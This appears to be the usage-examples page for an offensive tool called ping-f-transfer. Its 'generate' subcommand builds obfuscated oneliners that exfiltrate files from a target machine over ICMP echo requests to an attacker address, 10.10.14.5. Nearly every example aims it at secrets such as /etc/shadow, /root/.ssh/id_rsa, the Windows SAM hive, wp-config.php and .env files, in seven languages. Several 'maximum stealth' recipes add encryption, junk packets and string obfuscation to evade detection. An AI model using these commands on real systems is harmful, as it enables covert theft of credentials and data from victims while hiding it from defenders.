# `generate` — Examples

The `generate` subcommand creates a **base64-encoded oneliner** that you paste into a shell on the target machine. The oneliner reads the file and sends it via ICMP echo requests. Useful when you have shell access but can't install the tool.

> **Reminder:** Start `tshark` on the **receiver** before pasting the generated oneliner.
>
> ```bash
> sudo tshark -i <interface> -l -Y 'icmp.type==8 && ip.src==<sender-ip>' -T fields -e data.data > capture.hex
> ```

> **Tip:** Always use **absolute paths** with `-f` and quote them. The path is embedded in the payload.

## Table of Contents

- [Python](#python)
- [PowerShell](#powershell)
- [Bash](#bash)
- [Perl](#perl)
- [Ruby](#ruby)
- [PHP](#php)
- [Node.js](#nodejs)
- [Combining flags — quick reference](#combining-flags--quick-reference)

---

## Python

```bash
# Basic
ping-f-transfer generate -f '/tmp/secret.txt' -i 10.10.14.5 -l python

# With variable randomization
ping-f-transfer generate -f '/tmp/secret.txt' -i 10.10.14.5 -l python --randomize-var

# With string obfuscation (XOR-encodes file path, IP)
ping-f-transfer generate -f '/tmp/secret.txt' -i 10.10.14.5 -l python --obfuscate-strings

# With encryption + compression + all obfuscation
ping-f-transfer generate -f '/etc/shadow' -i 10.10.14.5 -l python \
  --compress --encrypt --enc-passphrase 'P@ssw0rd' \
  --randomize-var --obfuscate-strings

# With junk packets
ping-f-transfer generate -f '/home/user/data.db' -i 10.10.14.5 -l python --junk 3 --randomize-junk

# Split into 2 chunks for easier pasting on limited terminals
ping-f-transfer generate -f '/etc/passwd' -i 10.10.14.5 -l python --split-payload

# Split into 4 chunks
ping-f-transfer generate -f '/etc/passwd' -i 10.10.14.5 -l python --split-payload 4

# With a delay between pings
ping-f-transfer generate -f '/opt/backup.sql' -i 10.10.14.5 -l python -p 0.5 -r 0.2
```

---

## PowerShell

Oneliners use `powershell -enc` (base64 UTF-16LE encoded).

```bash
# Basic
ping-f-transfer generate -f 'C:\Users\admin\flag.txt' -i 10.10.14.5 -l powershell

# With variable randomization
ping-f-transfer generate -f 'C:\Users\admin\flag.txt' -i 10.10.14.5 -l powershell --randomize-var

# With string obfuscation
ping-f-transfer generate -f 'C:\Users\admin\flag.txt' -i 10.10.14.5 -l powershell --obfuscate-strings

# With encryption
ping-f-transfer generate -f 'C:\Users\admin\SAM' -i 10.10.14.5 -l powershell \
  --encrypt --enc-passphrase 's3cret' --obfuscate-strings --randomize-var

# Split into 3 chunks (useful for restricted PowerShell sessions)
ping-f-transfer generate -f 'C:\Users\admin\flag.txt' -i 10.10.14.5 -l powershell --split-payload 3

# With compression
ping-f-transfer generate -f 'C:\inetpub\logs\LogFiles\access.log' -i 10.10.14.5 -l powershell --compress

# With junk packets
ping-f-transfer generate -f 'C:\Windows\System32\config\SAM' -i 10.10.14.5 -l powershell --junk 2
```

---

## Bash

```bash
# Basic
ping-f-transfer generate -f '/etc/passwd' -i 10.10.14.5 -l bash

# With variable randomization
ping-f-transfer generate -f '/etc/passwd' -i 10.10.14.5 -l bash --randomize-var

# With string obfuscation
ping-f-transfer generate -f '/etc/shadow' -i 10.10.14.5 -l bash --obfuscate-strings

# Full stealth: encryption + compression + obfuscation + junk
ping-f-transfer generate -f '/root/.ssh/id_rsa' -i 10.10.14.5 -l bash \
  --compress --encrypt --random-passphrase 20 \
  --junk 3 --randomize-junk \
  --randomize-var --obfuscate-strings

# Split into 2 chunks
ping-f-transfer generate -f '/var/log/auth.log' -i 10.10.14.5 -l bash --split-payload

# With delay
ping-f-transfer generate -f '/tmp/dump.sql' -i 10.10.14.5 -l bash -p 1.0 -r 0.5
```

---

## Perl

```bash
# Basic
ping-f-transfer generate -f '/etc/passwd' -i 10.10.14.5 -l perl

# With variable randomization
ping-f-transfer generate -f '/etc/passwd' -i 10.10.14.5 -l perl --randomize-var

# With string obfuscation
ping-f-transfer generate -f '/opt/data/config.yaml' -i 10.10.14.5 -l perl --obfuscate-strings

# With encryption + obfuscation
ping-f-transfer generate -f '/etc/shadow' -i 10.10.14.5 -l perl \
  --encrypt --enc-passphrase 'p3rl_s3cret' --obfuscate-strings --randomize-var

# With compression + junk
ping-f-transfer generate -f '/var/log/syslog' -i 10.10.14.5 -l perl --compress --junk 2

# Split into 3 chunks
ping-f-transfer generate -f '/tmp/large_file.bin' -i 10.10.14.5 -l perl --split-payload 3
```

---

## Ruby

```bash
# Basic
ping-f-transfer generate -f '/etc/passwd' -i 10.10.14.5 -l ruby

# With variable randomization
ping-f-transfer generate -f '/etc/passwd' -i 10.10.14.5 -l ruby --randomize-var

# With string obfuscation
ping-f-transfer generate -f '/home/user/credentials.txt' -i 10.10.14.5 -l ruby --obfuscate-strings

# With encryption + compression
ping-f-transfer generate -f '/tmp/backup.tar.gz' -i 10.10.14.5 -l ruby \
  --compress --encrypt --enc-passphrase 'ruby_pass' --randomize-var

# With junk + randomized junk
ping-f-transfer generate -f '/opt/app/database.sqlite' -i 10.10.14.5 -l ruby --junk 4 --randomize-junk

# Split into 2 chunks
ping-f-transfer generate -f '/etc/shadow' -i 10.10.14.5 -l ruby --split-payload
```

---

## PHP

```bash
# Basic
ping-f-transfer generate -f '/var/www/html/wp-config.php' -i 10.10.14.5 -l php

# With variable randomization
ping-f-transfer generate -f '/var/www/html/wp-config.php' -i 10.10.14.5 -l php --randomize-var

# With string obfuscation
ping-f-transfer generate -f '/etc/passwd' -i 10.10.14.5 -l php --obfuscate-strings

# With encryption + obfuscation
ping-f-transfer generate -f '/var/www/html/.env' -i 10.10.14.5 -l php \
  --encrypt --enc-passphrase 'php_s3cret' --obfuscate-strings --randomize-var

# With compression
ping-f-transfer generate -f '/var/log/apache2/access.log' -i 10.10.14.5 -l php --compress

# With junk
ping-f-transfer generate -f '/tmp/dump.sql' -i 10.10.14.5 -l php --junk 3

# Split into 2 chunks
ping-f-transfer generate -f '/etc/shadow' -i 10.10.14.5 -l php --split-payload
```

---

## Node.js

Accepts both `-l node` and `-l javascript`.

```bash
# Basic (using "node")
ping-f-transfer generate -f '/etc/passwd' -i 10.10.14.5 -l node

# Basic (using "javascript" — same result)
ping-f-transfer generate -f '/etc/passwd' -i 10.10.14.5 -l javascript

# With variable randomization
ping-f-transfer generate -f '/opt/app/config.json' -i 10.10.14.5 -l node --randomize-var

# With string obfuscation
ping-f-transfer generate -f '/home/user/.bashrc' -i 10.10.14.5 -l node --obfuscate-strings

# With encryption + compression + obfuscation
ping-f-transfer generate -f '/var/lib/mysql/data.myd' -i 10.10.14.5 -l node \
  --compress --encrypt --enc-passphrase 'n0de_p@ss' --obfuscate-strings --randomize-var

# With junk + randomized junk
ping-f-transfer generate -f '/tmp/secrets.json' -i 10.10.14.5 -l node --junk 5 --randomize-junk

# Split into 3 chunks
ping-f-transfer generate -f '/etc/shadow' -i 10.10.14.5 -l node --split-payload 3
```

---

## Combining flags — quick reference

All languages support the same flag combinations. Here are some common recipes:

```bash
# Maximum stealth (any language — example with Bash)
ping-f-transfer generate -f '/etc/shadow' -i 10.10.14.5 -l bash \
  -p 1.0 -r 0.5 \
  --compress --encrypt --random-passphrase 32 \
  --junk 5 --randomize-junk \
  --randomize-var --obfuscate-strings

# Quick exfil, no frills (any language — example with Python)
ping-f-transfer generate -f '/tmp/data.txt' -i 10.10.14.5 -l python

# Encrypted + split for a constrained terminal (any language — example with Perl)
ping-f-transfer generate -f '/etc/shadow' -i 10.10.14.5 -l perl \
  --encrypt --enc-passphrase 'mypass' --split-payload 4

# Estimate only (no payload generated, no packets sent)
ping-f-transfer generate -f '/var/log/syslog' -i 10.10.14.5 -l ruby \
  -p 0.3 --junk 2 --estimate-transfer-time
```

### All flags combined

Using every available flag in a single command:

```bash
ping-f-transfer generate -f '/home/user/confidential.pdf' -i 10.10.14.5 -l python \
  -p 0.01 -r 0.003 \
  --junk 2 --randomize-junk \
  --compress \
  --encrypt aes-128 --random-passphrase 32 \
  --randomize-var --obfuscate-strings \
  --split-payload 3 \
  --capture-packets-filename capture_all.hex \
  --decoded-filename recovered.pdf \
  --no-banner
```
